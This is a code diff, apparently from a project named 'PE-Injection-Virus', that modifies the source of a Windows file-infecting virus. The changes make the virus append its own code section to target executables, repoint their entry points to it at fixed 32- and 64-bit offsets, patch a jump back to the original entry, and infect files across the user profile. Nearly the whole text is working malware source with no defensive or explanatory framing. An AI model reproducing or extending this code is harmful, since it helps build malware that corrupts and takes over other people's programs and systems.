@@ -2,55 +2,43 @@
 
 #include "shared.h"
 
-
-void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);
+#include <fstream>
+#include <filesystem>
+#include <vector>
 
 void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
 
 int main();
 
-void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress)
-{
-    if ( *((PUCHAR)data + entry_point) != 0xe9 )
-    {
-        return;
-    }
-    *(PDWORD)((PUCHAR)data + entry_point + 1) = main_addrress - (entry_point + 5);
-    return;
-}
+std::vector<unsigned char> section_data_global;
 
 void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
 {
-    PVOID section_data = NULL;
-    DWORD section_size = 0;
-    DWORD virus_section_va = 0;
-    DWORD this_file_entry_point = GetEntryPoint(data->this_file_base_address);
-    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
 
-    virus_section_va = virus_section->VirtualAddress;
-    section_size = virus_section->SizeOfRawData;
-    section_data = data->iat->fnVirtualAlloc(
-        NULL, 
-        section_size, 
-        MEM_COMMIT|MEM_RESERVE,
-        PAGE_READWRITE
-    );
+    DWORD virus_va_in_target;
+    DWORD virus_ra_in_target;
 
-    MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);
+    DWORD target_entry_point = GetEntryPoint(file_data);
 
-    ModifyJumpInstructionToVirusCode(section_data, GetEntryPoint(data->this_file_base_address) - virus_section_va, (DWORD)((DWORD)&main - (DWORD)data->this_file_base_address) - virus_section_va);
+    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data_global.data(), (DWORD)section_data_global.size(), data);
 
-    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);
+    virus_va_in_target = virus_section_in_target->VirtualAddress;
+    virus_ra_in_target = virus_section_in_target->PointerToRawData;
 
-    SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + ((DWORD)&main - (DWORD)data->this_file_base_address - virus_section_va));
+    if (Is64BitExecutable(file_data))
+    {
+        DWORD entry_point_64bit = 0x28F0;
+        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
+        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949);
+    }
+    else
+    {
+        DWORD entry_point_32bit = 0xca0;
+        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
+        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
+    }
 
-    data->iat->fnVirtualFree(
-        section_data,
-        0, 
-        MEM_RELEASE
-    );
-
-    *(DWORD*)new_file_size = file_size + section_size;
+    *(DWORD*)new_file_size = (DWORD)file_size + (DWORD)section_data_global.size();
     return;
 }
 
@@ -130,18 +118,19 @@ void WINAPI InfectFile(PSTR file_name, PDATA data)
     return;
 } 
 
-void EmptyFunction()
-{
-    return;
-}
-
 int main()
 {
+
+    std::string virus_path = "E:\\Code\\Github\\PE-Injection-Virus\\virus_code_section";
+    std::filesystem::path p{virus_path};
+    section_data_global.resize(std::filesystem::file_size(p));
+    std::ifstream ifs32(virus_path, std::ios_base::binary);
+    ifs32.read((char *)&section_data_global[0], std::filesystem::file_size(p));
+
     IAT iat;
     DATA data;
     data.iat = &iat;
     GetFunctionAddresses(&data);
-    data.iat->fnCreateThread(NULL, 0, InfectUserProfile, &data, 0, NULL);
-    EmptyFunction();
+    InfectUserProfile(&data);
     return 0;
 }
